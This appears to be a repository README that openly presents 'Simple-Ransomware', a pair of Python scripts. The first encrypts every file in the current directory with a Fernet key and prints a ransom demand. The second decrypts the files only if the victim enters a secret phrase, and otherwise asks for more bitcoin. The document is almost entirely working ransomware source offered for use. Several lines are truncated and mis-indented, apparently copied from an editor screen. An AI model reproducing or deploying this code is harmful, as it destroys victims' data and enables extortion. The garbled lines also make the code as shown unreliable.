# Simple-Ransomware
#This is my basic but effective ransomware creation.
Ransomware python code
Encryption:
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#let's find some files

files= []

for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decryp>
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as  thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:	
contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)

print("All of your files have been encrypted!. Sen>








Decryption:
GNU nano 8.2                      decrypt.py                               
 #!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#let's find some files

files= []

for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decryp>
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "mushrooms"
user_phrase = input("Enter the secret phrase to decrypt your files\n")
if user_phrase  == secretphrase:
for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("Congrats! Your files are decrypted. enjoy your mushro>
else:
        print("Sorry, wrong secret phrase. Send me more bitcoin.")


